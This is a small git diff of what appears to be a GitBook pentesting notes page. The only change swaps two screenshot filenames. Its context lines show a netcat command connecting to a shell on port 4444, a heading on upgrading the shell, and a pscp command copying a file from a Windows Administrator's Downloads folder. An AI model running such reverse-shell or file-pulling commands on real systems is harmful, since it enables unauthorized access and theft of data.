@@ -14,7 +14,7 @@ victim
 nc -nv 192.168.x.x 4444
 ```
 
-<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>
 
 ### Upgrading the shell
 
@@ -321,4 +321,4 @@ sudo pscp Administrator@<IP_WIN>:/Users/Administrator/Downloads/20240806021013_l
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>
